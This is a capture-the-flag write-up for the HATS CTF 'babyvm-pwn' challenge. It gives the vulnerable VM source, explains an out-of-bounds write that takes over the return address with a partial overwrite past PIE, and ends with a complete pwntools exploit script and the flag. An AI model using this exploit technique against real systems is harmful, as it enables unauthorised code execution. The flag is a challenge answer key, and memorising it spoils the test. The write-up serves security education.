I"]<p><strong>Category:</strong> Binary Exploitation</p>

<blockquote>
  <p>Now the vm is hosted on a server, i feel like there is something hidden in the server too…</p>

  <p>nc challs.hats.sg 1308</p>
</blockquote>

<p>Hint:</p>
<blockquote>
  <p>Can you modify the return pointer?</p>
</blockquote>

<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/HATS%20CTF/Binary%20Exploitation/babyvm-pwn%20%5B500%5D" class="btn btn--primary">Challenge Files</a></p>

<h2 id="write-up">Write-up</h2>
<p>Before reading this writeup, I suggest reading the writeup for <strong><a href="/babyvm-re/">babyvm-re [500]</a></strong> if you have not done so. The explanation of source code and “reversing part” of the challenge is explained there.</p>

<p>We start by running <code class="highlighter-rouge">checksec</code> on the binary:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>Note that both ASLR and PIE are enabled. ASLR randomizes the address of the stack, heap and libc, while PIE randomizes the address of .text section by initializing a random offset everytime the binary is run. This means the address of user defined functions in code, such as <strong>win</strong> or <strong>main</strong>, will not be fixed.</p>

<p>Here are the important parts of the source code:</p>

<p><strong>vmstep</strong> function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">vmstep</span><span class="p">(</span><span class="kt">char</span> <span class="n">op</span><span class="p">,</span><span class="kt">char</span><span class="o">*</span> <span class="n">stack</span><span class="p">){</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">op</span> <span class="o">|</span> <span class="mh">0x20</span><span class="p">){</span>
        <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'8'</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'9'</span><span class="p">:</span>
            <span class="n">ax</span> <span class="o">=</span> <span class="p">(</span><span class="n">op</span> <span class="o">|</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'a'</span><span class="p">:</span>
            <span class="n">ax</span> <span class="o">+=</span> <span class="n">stack</span><span class="p">[</span><span class="n">sp</span><span class="p">];</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'d'</span><span class="p">:</span>
            <span class="o">--</span><span class="n">ax</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">' '</span><span class="p">:</span>
        <span class="k">case</span> <span class="sc">'e'</span><span class="p">:</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'i'</span><span class="p">:</span>
            <span class="o">++</span><span class="n">ax</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'j'</span><span class="p">:</span>
            <span class="n">ip</span> <span class="o">+=</span> <span class="n">ax</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'m'</span><span class="p">:</span>
            <span class="n">ax</span> <span class="o">*=</span> <span class="n">stack</span><span class="p">[</span><span class="n">sp</span><span class="p">];</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'p'</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span><span class="n">stack</span><span class="p">[</span><span class="n">sp</span><span class="p">]);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'r'</span><span class="p">:</span>
            <span class="n">sp</span> <span class="o">=</span> <span class="n">ax</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'s'</span><span class="p">:</span>
            <span class="n">ax</span> <span class="o">-=</span> <span class="n">stack</span><span class="p">[</span><span class="n">sp</span><span class="p">];</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'u'</span><span class="p">:</span>
            <span class="n">stack</span><span class="p">[</span><span class="n">sp</span><span class="p">]</span> <span class="o">=</span> <span class="n">ax</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">'z'</span><span class="p">:</span>
            <span class="k">if</span><span class="p">(</span><span class="n">stack</span><span class="p">[</span><span class="n">sp</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">ip</span> <span class="o">+=</span> <span class="n">ax</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="nl">default:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Part of the code in <strong>main</strong>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">101</span><span class="p">]</span><span class="o">=</span><span class="p">{},</span>
         <span class="n">stack</span><span class="p">[</span><span class="mi">101</span><span class="p">]</span><span class="o">=</span><span class="p">{},</span>
         <span class="n">input</span><span class="p">[</span><span class="mi">1337</span><span class="p">]</span><span class="o">=</span><span class="p">{},</span>
         <span class="n">code1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"2u4mmimmiup2u6mimimimup2u7mmimmup2u6mmimmiup2u7mmmimup2u4mmmup2u7mmimmup2u6mimmmup2u6mmimmiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u5mup"</span><span class="p">,</span>
         <span class="n">code2</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"2u5mmimimup2u6mmimmiup2u7mmmimup2u6mimmmiup2u6mmimimup2u7mimmmiup2u6mimmmiup2u6mimimimup2u6mmimimiup2u5mup"</span><span class="p">,</span>
         <span class="n">code3</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"0r2u6mmr2u6mmimmiu0r2u5mimir2u5mmmu0r2u5mimr2u4mmmiu0r2u5mmir2u5mmmimiu0r2u5mmr2u4mimmiu0r2u4mimir2u7mimu0r2u4mimr2u6mmmmu0r2u4mmir2u4mimimimu0r2u4mmr2u5mimimimu0r2u7mir2u6mmimimu0r2u7mr2u5mimmmu0r2u6mir2u5mmmimu0r2u6mr2u5mmmiu0r2u5mir2u4mimimu0r2u5mr2u5mmimmiu9r2u5mmimu8r2u6mimmimu7r2u5mimmmu6r2u6mmimimiu5r2u7mmmmiu4r2u7mmimimiu3r2u5mmmmu2r2u5mmmimu1r2u4mmmmu0r2u4mimmmu"</span><span class="p">,</span>
         <span class="n">code4</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"2u5mmimimiup2u7mmmimup2u6mimimimiup2u6mimimimup2u6mmimimiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u4mmmiup2u5mup"</span><span class="p">,</span>
         <span class="n">code5</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"2u4mmimimup2u6mimimmup2u6mmmmiup2u6mmimimiup2u4mmmup2u7mmimup2u4mmmup"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">vmexec</span><span class="p">(</span><span class="n">code1</span><span class="p">,</span><span class="n">stack</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%1337s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
    <span class="n">vmexec</span><span class="p">(</span><span class="n">code2</span><span class="p">,</span><span class="n">stack</span><span class="p">);</span>
    <span class="n">vmexec</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="n">key</span><span class="p">);</span>
    <span class="n">vmexec</span><span class="p">(</span><span class="n">code3</span><span class="p">,</span><span class="n">stack</span><span class="p">);</span>
</code></pre></div></div>

<p>The challenge has a vulnerability similar to a buffer overflow. The statement <code class="highlighter-rouge">vmexec(input,key);</code> allows us to write instructions to overwrite values in the <code class="highlighter-rouge">key</code> buffer. However, as <strong>vmstep</strong> does not check <code class="highlighter-rouge">ax</code> to ensure its value is within range of the buffer, we are essentially able to overwrite any location in memory relative to the location of <code class="highlighter-rouge">key</code> in memory.</p>

<p>These instructions are essential to exploiting the vulnerability:</p>
<ul>
  <li><code class="highlighter-rouge">0</code> sets the value of <code class="highlighter-rouge">ax</code> to 0.</li>
  <li><code class="highlighter-rouge">d</code> decreases the value of <code class="highlighter-rouge">ax</code> by 1.</li>
  <li><code class="highlighter-rouge">i</code> increases the value of <code class="highlighter-rouge">ax</code> by 1.</li>
  <li><code class="highlighter-rouge">r</code> sets the value of <code class="highlighter-rouge">sp</code> to the value of <code class="highlighter-rouge">ax</code>. Basically, <code class="highlighter-rouge">sp = ax</code>.</li>
  <li><code class="highlighter-rouge">a</code> adds the value at <code class="highlighter-rouge">stack[sp]</code> to <code class="highlighter-rouge">ax</code>. Basically, <code class="highlighter-rouge">ax += stack[sp]</code>.</li>
  <li><code class="highlighter-rouge">u</code> sets the value at <code class="highlighter-rouge">stack[sp]</code> to the value of <code class="highlighter-rouge">ax</code>. Basically, <code class="highlighter-rouge">stack[sp] = ax</code>.</li>
</ul>

<p>Here’s an example to help you visualize the vulnerability. If the input contains:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">'0'</span> <span class="o">+</span> <span class="s">'i'</span><span class="o">*</span><span class="mi">999</span> <span class="o">+</span> <span class="s">'ru'</span>
</code></pre></div></div>
<p>We would overwrite <code class="highlighter-rouge">key[999]</code> with the value 999. As seen in the example, we are able to overwrite any area in memory as long as our payload is not more than 1337 characters.</p>

<p>The exploit works by overwriting the return instruction pointer (RIP) with the address of <strong>win</strong>, which would give us a shell. Developing the exploit has 3 stages:</p>

<ol>
  <li>
    <p><strong>Finding the offset of RIP</strong><br />
We can find the offset of RIP from the <code class="highlighter-rouge">key</code> buffer by a trial and error process. This can be done by overwriting every value up to a certain offset and using gdb to check if RIP is overwritten. We increase the offset if gdb is not overwritten, and decrease if it is overwritten. Keep in mind that the address of RIP would be smaller than the address of <code class="highlighter-rouge">key</code>, hence the offset should be negative.</p>
  </li>
  <li>
    <p><strong>Calculating the address of win</strong><br />
Due to PIE, the address of <strong>win</strong> will change everytime the binary is run. This means that the base offset of the address will change and only the last 2 bytes are known.</p>

    <p>Luckily for us, when we overwrite RIP, it contains the address of <code class="highlighter-rouge">main + 1501</code>. This means we only have to overwrite the last 2 bytes of RIP to call <strong>win</strong>, thus bypassing PIE. The last byte of <strong>win</strong>, which is fixed, is 0xa1. We can calculate the second last byte using <code class="highlighter-rouge">offset = (saved_rip - win) &gt;&gt; 8</code>, where <code class="highlighter-rouge">saved_rip</code> is the address of <code class="highlighter-rouge">main + 1501</code> and <code class="highlighter-rouge">win</code> is the address of <strong>win</strong>. This works as the difference between <strong>win</strong> and <code class="highlighter-rouge">main + 1501</code> is constant regardless of PIE.</p>
  </li>
  <li>
    <p><strong>Overwriting RIP with the address of win</strong><br />
An offset of 103 overwrites the second last byte of RIP while 104 overwrites the last byte. The following code overwrites the last 2 bytes of RIP to become the address of <strong>win</strong>:</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">payload</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="mi">103</span> <span class="o">+</span> <span class="s">'r'</span> <span class="o">+</span> <span class="s">"0au"</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="s">'u'</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">'0'</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="mi">104</span> <span class="o">+</span> <span class="s">'r'</span> <span class="o">+</span> <span class="s">'0'</span> <span class="o">+</span> <span class="s">'i'</span><span class="o">*</span><span class="mh">0xa1</span> <span class="o">+</span> <span class="s">'u'</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>Here’s the final exploit used to solve the challenge:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./chal"</span><span class="p">,</span>
    <span class="c1">#"libc" : "./",
</span>    <span class="c1">#"ld" : "./",
</span>    <span class="s">"HOST"</span> <span class="p">:</span> <span class="s">"challs.hats.sg"</span><span class="p">,</span>
    <span class="s">"PORT"</span> <span class="p">:</span> <span class="mi">1308</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">win</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'win'</span><span class="p">]</span>
    <span class="n">saved_rip</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span><span class="o">+</span><span class="mi">1501</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">saved_rip</span> <span class="o">-</span> <span class="n">win</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="mi">103</span> <span class="o">+</span> <span class="s">'r'</span> <span class="o">+</span> <span class="s">"0au"</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="s">'u'</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">'0'</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="mi">104</span> <span class="o">+</span> <span class="s">'r'</span> <span class="o">+</span> <span class="s">'0'</span> <span class="o">+</span> <span class="s">'i'</span><span class="o">*</span><span class="mh">0xa1</span> <span class="o">+</span> <span class="s">'u'</span>
  
    <span class="n">sla</span><span class="p">(</span><span class="s">"Enter the key</span><span class="si">\</span><span class="se">n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

    <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="n">config</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>

    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"HOST"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"PORT"</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">():</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
        <span class="k">else</span><span class="p">:</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

        <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag:</strong> HATS{vm5_4r3_c00l_4r3n7_7h3y}</p>
:ET